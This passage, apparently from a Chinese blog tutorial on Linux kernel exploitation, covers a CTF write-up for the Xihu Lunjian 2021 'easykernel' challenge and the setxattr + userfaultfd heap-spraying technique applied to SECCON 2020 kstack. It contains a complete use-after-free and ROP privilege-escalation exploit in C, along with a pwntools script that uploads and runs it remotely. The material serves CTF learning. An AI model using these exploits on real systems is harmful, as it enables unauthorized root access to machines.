<h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">这个 commit</a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="hljs-comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span><br><span class="hljs-comment">--- a/arch/x86/entry/common.c</span><br><span class="hljs-comment">+++ b/arch/x86/entry/common.c</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span><br> #ifdef CONFIG_X86_64<br> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)<br> &#123;<br><span class="hljs-addition">+    add_random_kstack_offset();</span><br>     nr = syscall_enter_from_user_mode(regs, nr);<br><br>     instrumentation_begin();<br></code></pre></td></tr></table></figure>

<p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了， <em>可以说这种利用方式基本上是废了</em></p>
<h3 id="例题：西湖论剑2021线上初赛-easykernel"><a href="#例题：西湖论剑2021线上初赛-easykernel" class="headerlink" title="例题：西湖论剑2021线上初赛 - easykernel"></a><em>例题：西湖论剑2021线上初赛 - easykernel</em></h3><p>今年的西湖论剑的宣传比以往的阵势要大得多，笔者在学校饭堂吃完饭出来都能碰到发传单的，这一次笔者与笔者的队友也参加了本次的西湖论剑CTF，其中有一道 easykernl 算是一道质量还可以的的 kernel pwn 入门题，可惜在比赛时笔者手慢一步只拿到了三血</p>
<p>闲话不多说，以下是题解</p>
<h4 id="①-分析-3"><a href="#①-分析-3" class="headerlink" title="① 分析"></a>① 分析</h4><p>首先查看启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 64M \<br>-cpu kvm64,+smep \<br>-kernel ./bzImage \<br>-initrd rootfs.img \<br>-nographic \<br>-s \<br>-append <span class="hljs-string">&quot;console=ttyS0 kaslr quiet noapic&quot;</span><br></code></pre></td></tr></table></figure>

<p>开了 SMEP 和 KASLR</p>
<p>运行启动脚本，查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>KVM: Mitigation: VMX unsupported<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br>Not affected<br></code></pre></td></tr></table></figure>

<p>开启了 PTI （页表隔离）</p>
<p>题目给了个 test.ko，按惯例这就是有漏洞的 LKM</p>
<p>拖入 IDA 进行分析，发现只定义了 ioctl，可以看出是常见的“菜单堆”，给出了分配、释放、读、写 object 的功能</p>
<p><img src="https://i.loli.net/2021/11/20/y7KwuZB3tTehGHP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>对于分配 object，我们需要传入如下形式结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对于释放、读、写 object，则需要传入如下形式结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h5 id="分配：0x20"><a href="#分配：0x20" class="headerlink" title="分配：0x20"></a>分配：0x20</h5><p>比较常规的 kmalloc，没有限制size，最多可以分配 0x20 个 chunk</p>
<p><img src="https://i.loli.net/2021/11/20/hzcYQx6OD7uVP5T.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="释放：0x30"><a href="#释放：0x30" class="headerlink" title="释放：0x30"></a>释放：0x30</h5><p><strong>kfree 以后没有清空指针，直接就有一个裸的 UAF 糊脸</strong></p>
<p><img src="https://i.loli.net/2021/11/20/jGy6mShgPAIJeQN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="读：0x40"><a href="#读：0x40" class="headerlink" title="读：0x40"></a>读：0x40</h5><p>会调用 show 函数</p>
<p><img src="https://i.loli.net/2021/11/20/MKeuzEXod94lI12.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>其实就是套了一层皮的读 object 内容，加了一点点越界检查</p>
<p><img src="https://i.loli.net/2021/11/20/5RsVwHToCYXdAIa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="写：0x50"><a href="#写：0x50" class="headerlink" title="写：0x50"></a>写：0x50</h5><p>常规的写入 object，加了一点点检查</p>
<p><img src="https://i.loli.net/2021/11/20/VFX2SgEn6YR9v3M.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="②-解法：UAF-seq-operations-pt-regs-ROP"><a href="#②-解法：UAF-seq-operations-pt-regs-ROP" class="headerlink" title="② 解法：UAF + seq_operations + pt_regs + ROP"></a>② 解法：UAF + seq_operations + pt_regs + ROP</h4><p>题目没有说明，那笔者默认应该是没开 Hardened Freelist，现在又有 UAF，那么解法就是多种多样的了，笔者这里选择用 <code>seq_operations</code> + <code>pt_regs</code> 构造 ROP 进行提权</p>
<p>exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_OPS_0 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-type">long</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span>  idx;<br>    <span class="hljs-type">size_t</span>  size;<br>    <span class="hljs-type">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span>  size;<br>    <span class="hljs-type">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">writeChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">allocChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">alloc</span> =</span> <br>    &#123;<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><br><span class="hljs-type">size_t</span>      buf[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span>      swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-type">size_t</span>      init_cred;<br><span class="hljs-type">size_t</span>      pop_rdi_ret;<br><span class="hljs-type">long</span>        seq_fd;<br><span class="hljs-type">void</span> *      kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span>      kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span>      commit_creds;<br><span class="hljs-type">size_t</span>      gadget;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br><br>    allocChunk(<span class="hljs-number">0x20</span>, buf);<br>    deleteChunk(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    readChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    kernel_offset = buf[<span class="hljs-number">0</span>] - SEQ_OPS_0;<br>    kernel_base += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset; <span class="hljs-comment">// add rsp 一个数然后 pop 一堆寄存器最后ret，具体的不记得了，懒得再回去翻了</span><br><br>    buf[<span class="hljs-number">0</span>] = gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    writeChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <span class="hljs-comment">// add rsp, 0x40 ; ret</span><br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>远程设置了120s关机，glibc 编译出来的可执行文件会比较大没法传完，这里笔者选择使用 musl</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">musl-gcc exp.c -o exp -static -masm=intel<br></code></pre></td></tr></table></figure>

<blockquote>
<p>其实写纯汇编是最小的，但是着急抢一血所以还是写常规的C，早上又有一个实验要做把时间占掉了结果最后只拿了三血…</p>
</blockquote>
<p>打远程用的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;82.157.40.132&quot;</span>, <span class="hljs-number">54100</span>)<br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>传远程，运行，成功提权</p>
<p><img src="https://i.loli.net/2021/11/20/4Mtasj1QRYUAhcI.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="setxattr-userfaultfd-堆占位技术（may-obsolete）"><a href="#setxattr-userfaultfd-堆占位技术（may-obsolete）" class="headerlink" title="setxattr + userfaultfd 堆占位技术（may obsolete）"></a><em>setxattr + userfaultfd 堆占位技术（may obsolete）</em></h2><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p>
<p>观察 setxattr 源码，发现如下调用链：</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure>

<p>在 <code>setxattr()</code> 函数中有如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong></p>
<p>但是该 object 在 setxattr 执行结束时又会被放回 freelist 中，设想若是我们需要劫持该 object 的前 8 字节，那将前功尽弃</p>
<p>重新考虑 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，那么让我们考虑如下场景：</p>
<p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行<strong>跨页面的拷贝</strong>，当 copy_from_user 拷贝到第二个页面时<strong>便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</strong></p>
<p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>这便是 setxattr + userfaultfd 结合的堆占位技术</p>
<h3 id="例题：SECCON-2020-kstack"><a href="#例题：SECCON-2020-kstack" class="headerlink" title="例题：SECCON 2020 kstack"></a>例题：SECCON 2020 kstack</h3><h4 id="①-分析-4"><a href="#①-分析-4" class="headerlink" title="① 分析"></a>① 分析</h4><p>惯例地查看启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 512M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -net user -net nic -device e1000 \<br>    -monitor /dev/null \<br>    -nographic<br></code></pre></td></tr></table></figure>

<p>开启了 smep 和 kaslr</p>
<p>查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></td></tr></table></figure>

<p>开启了 KPTI</p>
<p>拖入 IDA 中进行分析，发现只定义了一个 ioctl 的两种功能</p>
<h5 id="创建链表节点"><a href="#创建链表节点" class="headerlink" title="创建链表节点"></a>创建链表节点</h5><p>先分析第一种功能，在这里先用 kmalloc 分配了一个 object，之后将其使用头插法通过全局变量 head 插入到单向链表中</p>
<p><img src="https://i.loli.net/2021/11/24/mxPugZ1TQCE3aNd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>分析可知其结构应当如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>            *unknown;<br>    <span class="hljs-type">char</span>             data[<span class="hljs-number">8</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>     *<span class="hljs-title">next</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>该结构体前八个字节是从 <code>current_task</code> 的某个特殊偏移取的值，经尝试可知为线程组 id，我们来看其分配过程，使用了 <code>kmem_cache_alloc(kmalloc_caches[5], 0x60000C0)</code>，第二个参数是 flag ，为常规的 <code>GFP_KERNEL</code>，这里可以暂且忽略</p>
<p>现在我们来看第一个参数，笔者推测这应当是 gcc 优化 kmalloc 的结果；在内核中有一个数组 <code>kmalloc_caches</code> 存放 kmem_cache，在内核源码 <code>mm/slab_common.c</code> 中我们可以得知其初始化的大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.</span><br><span class="hljs-comment"> * kmalloc_index() supports up to 2^25=32MB, so the final entry of the table is</span><br><span class="hljs-comment"> * kmalloc-32M.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>    INIT_KMALLOC_INFO(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">96</span>, <span class="hljs-number">96</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">192</span>, <span class="hljs-number">192</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">8</span>, <span class="hljs-number">8</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>),<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>下标 <code>[5]</code> 即第六个 kmem_cache 为 <code>kmalloc-32</code>，由此我们可以得知分配的 object 大小为 0x20</p>
<h5 id="删除链表节点"><a href="#删除链表节点" class="headerlink" title="删除链表节点"></a>删除链表节点</h5><p>比较简单且常规的脱链操作，会将同一线程组创建的节点中的头节点删除，并将其 data 拷贝给用户</p>
<p><img src="https://i.loli.net/2021/11/24/jAEpYPWQSvDbq5M.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>若并节点所属线程组与当前进程非同一线程组，则会一直找到那个线程组的节点或是遍历结束为止</p>
<p><img src="https://i.loli.net/2021/11/25/s2SDNnlTWPobk6d.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>分析下来，联想到题目名叫 <code>k stack</code>，我们不难猜出这是在模拟栈的 push 与 pop 操作</p>
<h4 id="②-利用-1"><a href="#②-利用-1" class="headerlink" title="② 利用"></a>② 利用</h4><p>我们注意到其拷贝时使用了 copy_from_user 与 copy_to_user，且 <strong>ioctl 操作全程没有加锁</strong>，这为 userfaultfd 提供了可能性</p>
